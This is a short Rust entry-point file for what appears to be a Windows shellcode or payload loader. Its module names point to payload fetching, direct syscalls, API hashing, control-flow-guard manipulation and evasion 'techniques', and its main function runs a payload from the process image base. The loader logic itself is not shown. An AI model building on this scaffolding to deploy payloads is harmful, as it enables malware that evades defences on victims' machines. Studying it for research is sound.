// #![no_std]

#![no_main]
extern crate alloc;

mod cfg_manip;
mod get_payload;
mod hash;
mod intrinsics;
mod logger;
mod payload;
mod resolve;
mod run_payload;
mod syscalls;
mod techniques;

#[unsafe(no_mangle)]
pub unsafe extern "C" fn main() -> u32 {
    unsafe {
        run_payload::run_payload({ *ntapi::ntpsapi::NtCurrentPeb() }.ImageBaseAddress as *mut u8);
    }
    0
}
